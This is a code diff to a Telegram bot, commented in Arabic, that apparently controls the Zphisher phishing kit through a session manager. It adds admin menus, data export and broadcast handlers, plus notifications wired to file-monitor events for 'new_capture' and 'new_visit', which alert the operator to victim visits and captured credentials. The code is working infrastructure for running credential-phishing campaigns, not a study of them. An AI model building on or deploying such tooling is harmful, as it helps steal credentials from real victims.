@@ -23,6 +23,9 @@ from utils.security import auth_manager, require_auth, rate_limit
 from keyboards.main_menu import MainMenuKeyboard, QuickActionKeyboard, StatusKeyboard
 from keyboards.site_selection import SiteSelectionKeyboard
 from utils.zphisher_control import session_manager
+from utils.notifications import NotificationManager
+from utils.file_monitor import file_monitor
+from handlers.admin_handlers import *
 
 # إعداد السجلات
 logging.basicConfig(
@@ -39,6 +42,9 @@ logger = logging.getLogger(__name__)
 # إنشاء مثيل البوت والموزع
 bot = Bot(token=settings.BOT_TOKEN)
 dp = Dispatcher()
+
+# متغير عام لمدير الإشعارات
+notification_manager = None
 
 @dp.message(CommandStart())
 @rate_limit
@@ -440,6 +446,46 @@ async def callback_handler(callback: types.CallbackQuery, user):
                 parse_mode="Markdown"
             )
         
+        # ===================== المعالجات الإدارية =====================
+        
+        # لوحة الإدارة الرئيسية
+        elif data == "admin_panel":
+            await admin_panel_handler(callback, user)
+        
+        # إدارة المستخدمين
+        elif data == "user_management":
+            await user_management_handler(callback, user)
+        elif data.startswith("list_users_"):
+            page = int(data.split("_")[-1])
+            await list_users_handler(callback, user, page)
+        elif data.startswith("manage_user_"):
+            target_user_id = int(data.split("_")[-1])
+            await manage_user_handler(callback, user, target_user_id)
+        
+        # إدارة النظام
+        elif data == "system_management":
+            await system_management_handler(callback, user)
+        elif data == "create_backup":
+            await create_backup_handler(callback, user)
+        
+        # التحليلات
+        elif data == "analytics_dashboard":
+            await analytics_dashboard_handler(callback, user)
+        
+        # مركز الأمان
+        elif data == "security_center":
+            await security_center_handler(callback, user)
+        
+        # تصدير البيانات
+        elif data == "export_data":
+            await export_data_handler(callback, user)
+        
+        # الإرسال الجماعي
+        elif data == "broadcast_message":
+            await broadcast_message_handler(callback, user)
+        
+        # ===================== نهاية المعالجات الإدارية =====================
+        
         # تأكيد الرد على الاستعلام
         await callback.answer()
         
@@ -471,6 +517,15 @@ async def on_startup():
         # بدء فاحص صحة قاعدة البيانات
         await health_checker.start()
         
+        # تهيئة نظام الإشعارات
+        global notification_manager
+        notification_manager = NotificationManager(bot)
+        await notification_manager.start()
+        
+        # ربط callbacks مع مراقب الملفات
+        file_monitor.add_callback('new_capture', notification_manager.notify_new_capture)
+        file_monitor.add_callback('new_visit', notification_manager.notify_new_visit)
+        
         # إعداد أوامر البوت
         await setup_bot_commands()
         
@@ -496,6 +551,13 @@ async def on_shutdown():
     try:
         # إيقاف فاحص صحة قاعدة البيانات
         await health_checker.stop()
+        
+        # إيقاف نظام الإشعارات
+        if notification_manager:
+            await notification_manager.stop()
+        
+        # إيقاف مراقبة الملفات
+        await file_monitor.cleanup()
         
         # إغلاق اتصال قاعدة البيانات
         await close_database()
